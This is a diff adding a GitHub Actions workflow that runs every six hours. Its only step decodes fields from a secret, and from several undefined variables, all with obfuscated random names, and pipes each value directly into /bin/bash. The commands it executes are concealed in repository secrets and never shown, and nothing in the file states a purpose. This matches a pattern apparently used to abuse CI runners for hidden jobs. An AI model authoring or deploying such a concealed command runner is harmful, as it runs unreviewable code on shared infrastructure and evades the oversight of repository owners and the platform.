@@ -1,0 +1,24 @@
+name: scavengerswing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: scavengerswing
+        env:
+          pgrau97853: ${{ secrets.pgrau97853 }}
+        run: |
+          echo $pgrau97853 | jq -r .kmzwh573 | /bin/bash
+          echo $jlkpb09 | jq -r .f00002 | /bin/bash
+          echo $n449 | jq -r .s7 | /bin/bash
+          echo $i53 | jq -r .zzg48 | /bin/bash
+          echo $zqzle9051 | jq -r .cm48531 | /bin/bash
+          echo $q71681 | jq -r .v067 | /bin/bash
+          echo $ymiry74416 | jq -r .uoh830 | /bin/bash
+          echo $o935 | jq -r .imuof8 | /bin/bash
+
